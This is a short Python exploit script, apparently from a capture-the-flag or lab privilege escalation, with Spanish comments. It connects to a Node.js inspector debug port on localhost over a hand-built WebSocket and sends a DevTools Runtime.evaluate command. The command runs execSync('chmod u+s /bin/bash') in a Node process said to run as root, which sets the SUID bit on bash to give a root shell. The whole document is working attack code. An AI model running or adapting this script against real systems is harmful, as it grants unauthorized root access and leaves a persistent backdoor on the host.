#!/usr/bin/env python3
import socket, base64, hashlib, struct, json, sys

HOST = "127.0.0.1"
PORT = 9229
PATH = "/c23d5586-b2af-41f0-ba2c-5d1014d3c6ea"  # actualizar si cambia

def ws_handshake(sock):
    key = base64.b64encode(b"engineer_privesc_key123").decode()
    req = (
        f"GET {PATH} HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "\r\n"
    )
    sock.send(req.encode())
    resp = sock.recv(4096)
    if b"101" not in resp.split(b"\r\n")[0]:
        print("[-] Handshake fallo:", resp)
        sys.exit(1)
    print("[+] Handshake OK")

def ws_send(sock, data):
    payload = data.encode()
    header = bytearray()
    header.append(0x81)  # FIN + text frame
    length = len(payload)
    mask_bit = 0x80
    if length <= 125:
        header.append(mask_bit | length)
    elif length <= 65535:
        header.append(mask_bit | 126)
        header += struct.pack(">H", length)
    else:
        header.append(mask_bit | 127)
        header += struct.pack(">Q", length)
    mask_key = b"\x00\x00\x00\x00"  # mascara nula, valido segun RFC aunque poco comun
    header += mask_key
    sock.send(bytes(header) + payload)

def ws_recv(sock):
    data = sock.recv(65536)
    return data

def send_cdp(sock, msg_id, method, params):
    msg = json.dumps({"id": msg_id, "method": method, "params": params})
    ws_send(sock, msg)
    return ws_recv(sock)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
ws_handshake(s)

# Comando a ejecutar como ROOT en el proceso Node
cmd = "require('child_process').execSync('chmod u+s /bin/bash')"

resp = send_cdp(s, 1, "Runtime.evaluate", {
    "expression": cmd,
    "includeCommandLineAPI": True
})
print(resp)
s.close()